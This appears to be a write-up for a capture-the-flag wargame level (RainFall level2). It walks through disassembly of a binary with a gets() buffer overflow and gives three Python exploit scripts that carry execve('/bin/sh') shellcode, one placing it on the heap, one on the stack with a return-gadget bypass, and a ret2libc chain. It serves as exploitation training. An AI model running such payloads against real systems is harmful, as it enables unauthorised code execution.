
### notes
```c
0x080484d4  p
0x0804853f  main
```

### 0x0804853f : main() : disassembly
* __`<0> -> <+3> : prepare stack frame for main function`__
```c
   0x0804853f <+0>:	push   ebp
   0x08048540 <+1>:	mov    ebp,esp
   0x08048542 <+3>:	and    esp,0xfffffff0
```
* __`<+6> : call the p function`__
```
0x08048545 <+6>:	call   0x80484d4 <p>
```

* __`<+11> -> <+12> : exit the MAIN FUNCTION`__
```c
0x0804854a <+11>:	leave  
0x0804854b <+12>:	ret  
```

### 0x080484d4 : p() : disassembly
- notebook: (to convert `hex` to `dec` and assign variable names for better reading)
```c

{
    const returnAddress = ebp+4
    char *buffer1[65 ~ 76-12] = ebp-76 // ~ebp-0x4c
    char *returnAddress = ebp-12 = returnAddress // ~ebp-0xc


    // 0x68 ... 104
    // 0x4c ... 76
    // 0xc  ... 12
}
```
* __`<0> -> <+3> : prepare stack frame for p function with size of 104`__
```c
0x080484d4 <+0>:	push   ebp
0x080484d5 <+1>:	mov    ebp,esp
0x080484d7 <+3>:	sub    esp,104
```
```c
0x080484da <+6>:	mov    eax,ds:0x8049860 // stdout
0x080484df <+11>:	mov    DWORD PTR [esp],eax
0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
fflush(stdout)
```
```c
0x080484e7 <+19>:	lea    eax,[buffer1]
0x080484ea <+22>:	mov    DWORD PTR [esp],eax
0x080484ed <+25>:	call   0x80483c0 <gets@plt>
gets(buffer1)
```
```c
0x080484f2 <+30>:	mov    eax,DWORD PTR [ebp+4 ~ addr of return]
0x080484f5 <+33>:	mov    DWORD PTR [returnAddress],eax
0x080484f8 <+36>:	mov    eax,DWORD PTR [returnAddress]
0x080484fb <+39>:	and    eax,0xb0000000
0x08048500 <+44>:	cmp    eax,0xb0000000
0x08048505 <+49>:	jne    0x8048527 <p+83>
if(returnAddress && 0xb0000000 != 0xb0000000){
    jump to <p+83>
}

```
```c
0x08048507 <+51>:	mov    eax,0x8048620 // "(%p)\n"
0x0804850c <+56>:	mov    edx,DWORD PTR [returnAddress]
0x0804850f <+59>:	mov    DWORD PTR [esp+4],edx
0x08048513 <+63>:	mov    DWORD PTR [esp],eax
0x08048516 <+66>:	call   0x80483a0 <printf@plt>
printf("(%p)\n", returnAddress)
```
```c
0x0804851b <+71>:	mov    DWORD PTR [esp],1
0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
exit(1)
```
```c
0x08048527 <+83>:	lea    eax,[buffer1]
0x0804852a <+86>:	mov    DWORD PTR [esp],eax
0x0804852d <+89>:	call   0x80483f0 <puts@plt>
puts(buffer)
```
```c
0x08048532 <+94>:	lea    eax,[buffer1]
0x08048535 <+97>:	mov    DWORD PTR [esp],eax
0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
strdup(buffer1)
```
```c
0x0804853d <+105>:	leave  
0x0804853e <+106>:	ret 
return
```
### Code Prediction 
```c
void p() {
    char *buffer1[64];
    char *returnAddress = __return_address__;

    fflush(stdout);
    gets(buffer1);

    if(returnAddress & 0xb0000000 == 0xb0000000){
        printf("(%p)\n", returnAddress);
        exit(1);
    }
    puts(buffer);
    strdup(buffer1);
    return;
}
int main(int argc(ebp+0x8), char **argv(ebp+12)) {
    p()
    return ();
    
}

```
### Stack Illustration
```c
+-------------------+   <----- HIGH ADDRESSE
|                   |
+-------------------+ +12                                                         
|                   |                                                   
+-------------------+ +8                                                  
|       OLD_EIP     | eip of main fubction                                
+-------------------+ +4                                                
|       OLD_EBP     | ebp of main function                              
+-------------------+ <---EBP <-----------------------------------------\
|and esp,0xfffffff0 | <--- stack alignement                             |
+-------------------+                                                   |
|      MAIN_EIP     |                                                   | main stack frame
+-------------------+                                                   |
|      MAIN_EBP     |                                                   |
+-------------------+ +104 <--------------------------------------------/
|                   |                                                   |
+-------------------+ +100                                              |
|                   |                                                   |
+-------------------+ +96 <-------+                                     |
[  addr in ebp+4    ]             | returnAddress buffer (4 bytes)      |
+-------------------+ +92 <-------+                                     |
|  end of buffer1   |             |                                     |
+-------------------+ +88         |                                     |
|                   |             |                                     |
+-------------------+ +84         | buffer1 (64 bytes)                  |
          *                       |                                     |
          *                       |                                     |
          *                       |                                     | p stack frame (size:104 bytes)
+-------------------+             |                                     |
| start of buffer1  |             |                                     |
+-------------------+ +28  <------/                                     |
|                   |                                                   |
+-------------------+ +24                                               |        
|                   |                                                   |
+-------------------+ +20                                               |       
|                   |                                                   |
+-------------------+ +16                                               |         
|                   |                                                   |
+-------------------+ +12                                               |         
|                   |                                                   |
+-------------------+ +8                                                |           
|                   |                                                   |
+-------------------+ +4                                                |          
|                   |                                                   |
+-------------------+ <---ESP  low memory address-----------------------/
```
---
### Process of the Exploit
- the code apply the & operation with `0xb0000000` to prevent us from overwriting the EIP with a stack address
which means we cant inject shellcode on stack with the normal way
as we can see the program uses strdup , which means the HEAP since strddup calls malloc,
good
we either can inject shellcode in the hype
or : inject shellcode in the stack but add a gadget address to bypass that check
or : use the `ret2libc` exploit (call the system function with "/bin/sh") and also add a gadget address to bypass the check 

---
### Solution :

##### 1:- use the shellcode exploit in the Hype
since the programm calls strdup which calls malloc 
that's mean a hype there baby :* 
which mean we can use the address of tha allocated hype section to execute our shell code after we fill the buffer of 80 
which mean we can write our adress after 80 character



```shell
level2@RainFall:~$ ltrace ./level2  <<< "AAAABBBBCCCC"

__libc_start_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                               = 0
gets(0xbffff6fc, 0, 0, 0xb7e5ec73, 0x80482b5)    = 0xbffff6fc
puts("AAAABBBBCCCC"AAAABBBBCCCC
)                             = 13
strdup("AAAABBBBCCCC")                           = 0x0804a008
+++ exited (status 8) +++

level2@RainFall:~$
```
strdup returns __0x0804a008__

hypeAdd = 0x0804a008
shell code + padding + hypeAddress = 84
....21.................59..................4...........= 84
- script that helps generate the exploit
```python
import struct
shell_code = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
#80 cd c9 31 e3 89 6e 69 62 2f 68 73 2f 2f 68 52 99 58 0b 6a
padding = "A" * 55
hypeAddress = struct.pack("I", 0x0804a008) # convert the hyper address to little indian format

pattern = shell_code + padding + hypeAddress
print(pattern)
```
___
##### 2:- use the shellcode exploit in the Stack
```python
import struct
padding = "\x90" * 80
# padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT" # length 80
shellcode =  "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
skipAddre = struct.pack("I", 0x0804853e) # to bypass the return address check
EIP = struct.pack("I", 0xbffff71c + 60) # stack address but we move forward by x bytes to drop in nopslide nopslide
NOP  = "\x90" * 100 # \x90 == nothing == nosplide : 
                         # when program get redirected to this aread of nops it will sldie to the shell code
shellcode

print(padding + skipAddre + EIP + NOP + shellcode)
```
___
##### 3:- use Ret2Libc exploit in the stack


```py
import struct
# p()    return_adress = 0x0804853e
# main() return_adress = 0x0804854b

padding = "\x90" * 80
ret_adress = str(struct.pack("I", 0x0804853e)) #p() func ret addr
system = str(struct.pack("I", 0xb7e6b060))
returnAfterSystem = str(struct.pack("I", 0xb7e5ebe0)) # address of exit() function , system need it 
bin_sh = str(struct.pack("I", 0xb7f8cc58)) # /bin/sh

payload = padding + ret_adress + system + returnAfterSystem +  bin_sh
#          80     +     4      +    4   +         4         +   4 
print(payload)

```

---

### Ressources :

1. [ret2lib - exact exercice - protostart](https://0xrick.github.io/binary-exploitation/bof6/)
1. [buffer overflow + shellcode ](https://0xrick.github.io/binary-exploitation/bof5/)
1. [doc3](link)
...
1. [docX](link)